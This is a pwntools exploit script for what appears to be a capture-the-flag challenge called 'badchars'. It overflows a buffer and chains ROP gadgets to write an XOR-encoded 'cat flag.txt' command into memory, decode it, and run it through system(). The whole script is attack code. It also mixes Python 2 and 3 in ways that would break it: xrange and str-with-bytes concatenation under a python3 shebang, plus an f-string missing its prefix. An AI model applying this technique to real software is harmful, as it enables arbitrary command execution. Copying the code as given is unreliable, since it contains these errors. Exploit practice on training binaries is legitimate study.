#!/usr/bin/python3

from pwn import *

#context.log_level = 'DEBUG'

xor_r14b_into_r15_addr = 0x00400b30
pop_r14_r15_addr = 0x00400b40

mov_r12_into_r13_addr = 0x00400b34
pop_r12_r13_addr = 0x00400b3b

pop_rdi_addr = 0x00400b39

def rop_mov_qword_into(dst, qword):
    rop = ''
    rop += p64(pop_r12_r13_addr)
    rop += qword
    rop += p64(dst)
    rop += p64(mov_r12_into_r13_addr)
    return rop

def rop_xor_byte_into(dst, xor_byte):
    rop = ''
    rop += p64(pop_r14_r15_addr)
    rop += p64(ord(xor_byte))
    rop += p64(dst)
    rop += p64(xor_r14b_into_r15_addr)
    return rop

command = "cat flag.txt\x00\x00\x00\x00"

badchars = ['b', 'i', 'c', '/', ' ', 'f', 'n', 's']

indexes = [0, 3, 4]

xor_byte = '0'

xored_command = ''.join([chr(ord(xor_byte) ^ ord(c)) if index in indexes else c for index, c in enumerate(command)])
#print xored_command

filename = './badchars'

elf = ELF(filename)

system_addr = elf.symbols.system
exit_addr = elf.symbols.exit
bss_addr = elf.bss(0)

padding = 'A' * 40

payload = padding

# mov xored_command into bss
for index in xrange(0, len(xored_command), 8):
    payload += rop_mov_qword_into(bss_addr+index, xored_command[index:index+8])

# mov xor xored_command in bss with xor_byte
for index in indexes:
    payload += rop_xor_byte_into(bss_addr+index, xor_byte)

# call system(command)
payload += p64(pop_rdi_addr)
payload += p64(bss_addr)
payload += p64(system_addr)

# call exit(0)
payload += p64(pop_rdi_addr)
payload += p64(0)
payload += p64(exit_addr)

p = process(filename)

"""
gdb.attach(p, '''
        break * 0x004009de
        continue
        ''')
"""

p.recvuntil('\n> ')

p.sendline(payload)

log.info("Flag: {p.recv(1024).decode()}")
